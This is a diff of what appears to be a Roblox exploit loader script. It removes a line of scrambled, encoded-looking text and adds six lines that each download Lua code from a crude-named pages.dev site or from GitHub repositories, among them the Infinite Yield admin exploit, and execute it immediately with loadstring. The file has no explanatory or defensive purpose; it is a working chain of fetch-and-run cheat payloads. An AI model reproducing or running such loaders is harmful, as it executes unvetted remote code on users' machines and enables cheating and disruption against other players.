@@ -1,2 +1,6 @@
--- https://ichfickdeinemutta.pages.dev/Micupcombo.lua
-ZY4da3J0cmluZw7jkVNiOkh0dHBHdrbQPWt0dHBzOmImiB9nZ2lja2RlT+qVU3J0dGEucGF0p4sxZ2V2L2ZhLmyHCWxqLmx1YSIPrdgXDWxvYWRzdGGrlngrZ2FtZToFfZUMSGR0KCJodFL0gwQoL2ljaGZpcKmcempuZW11dDlozwxuZmVzLmRlUKu3XWtvbmUubHVy4NE2KykKbG9hKXqVDmZvZyhnYW1DvrhKc3BHZXQoInu2jG9wOi8vcmE6J4YVe2l1YnVzZVTnn1BzZW50LmNvfu29e2RlSVkvaSNviBJmdWV5aWVsQqudX3R0ZXIvc29msJt6ISkpKCkKIWaAGHx1cmluZyhB5Z1bPUh0dHBHZWfq2nd3dHBzOi9ie4ALIWZpdGh1YlP3lUxkb250ZW50PaGXcixHaTczM3wmkh99aHB0cy9tR+2eEUJtb3RlLmxmo9o2KigpCmxvLG2SCH1obmcoZ2FL4cp2c3RwR2V0KDGqjGtzczovL3Isfs8bZnVodWJ1c0P2k1FpdGVudC5jfK/XVzEwQ2FsaS97hCVbLlN5c3RlS8aCUWxlbi9tYWl97Yt8cWlwdCIpZCHIdmNuYWRzdHJP6pcWYGFtZTpIdGeyv3p3KCJodHQ9ettTIGhjaGZpY03glVdpZW11dHRhPbKZeGZzLmRldmJLgA9qcWxhdGUuSvGRHC4pKCkK
+loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/facefuck.lua"))()
+loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/Gclone.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
+loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/Baseplate.lua"))()
